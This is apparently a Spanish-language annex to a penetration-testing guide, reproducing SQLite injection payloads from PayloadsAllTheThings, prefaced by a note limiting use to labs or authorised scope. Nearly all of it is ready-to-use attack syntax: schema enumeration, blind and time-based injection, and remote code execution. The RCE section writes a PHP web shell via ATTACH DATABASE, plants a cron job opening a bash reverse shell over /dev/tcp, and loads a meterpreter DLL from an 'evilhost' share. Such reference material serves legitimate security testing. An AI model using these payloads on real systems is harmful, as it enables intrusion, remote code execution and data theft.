# SQL injection: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [SQL Injection/SQLite Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/SQL%20Injection/SQLite%20Injection.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. SQLite Inyección / SQLite Comentarios

### Variantes presentes en tablas o texto del apartado

```text
--
/**/
```

## 2. SQLite Inyección / SQLite Enumeration

### Variantes presentes en tablas o texto del apartado

```text
select sqlite_version();
```

## 3. SQLite String / SQLite String Metodología

### Variantes presentes en tablas o texto del apartado

```text
SELECT sql FROM sqlite_schema
SELECT sql FROM sqlite_master
SELECT tbl_name FROM sqlite_master WHERE type='table'
SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');
SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'
SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')
```

## 4. SQLite Ciega / SQLite Ciega Metodología

### Variantes presentes en tablas o texto del apartado

```text
AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table
AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number
AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')
CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END
```

## 5. SQLite Ciega / SQLite Ciega Con Substring Equivalent

### Variantes presentes en tablas o texto del apartado

```text
SUBSTRING('foobar', <START>, <LENGTH>)
SUBSTR('foobar', <START>, <LENGTH>)
```

## 6. SQLite Inyección / SQlite Basada en errores

```sql
AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
```

## 7. SQLite Inyección / SQlite Basada en tiempo

```sql
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

## 8. SQLite Remote Ejecución de código / Attach Base de datos

```sql
ATTACH DATABASE '/var/www/shell.php' AS shell;
CREATE TABLE shell.pwn (dataz text);
INSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');--
```

```ps1
file shell.php  
shell.php: SQLite 3.x database, last written using SQLite version 3051000, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
```

```sql
ATTACH DATABASE '/etc/cron.d/pwn.task' AS cron;
CREATE TABLE cron.tab (dataz text);
INSERT INTO cron.tab (dataz) VALUES (char(10) || '* * * * * root bash -i >& /dev/tcp/127.0.0.1/4242 0>&1' || char(10));--
```

### Variantes presentes en tablas o texto del apartado

```text
5351 4c69 7465 2066 6f72 6d61 7420 3300
<?php
```

## 9. SQLite Remote Ejecución de código / Load_extension

```sql
SELECT load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```

```sql
sqlite> .dbconfig
    load_extension on
```

```ps1
gcc -g -fPIC -shared demo.c -o demo.so
```

### Variantes presentes en tablas o texto del apartado

```text
load_extension()
load_extension on
.so
.dll
```

## 10. SQLite Archivo Manipulation / SQLite Write Archivo

```sql
SELECT writefile('/path/to/file', column_name) FROM table_name
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
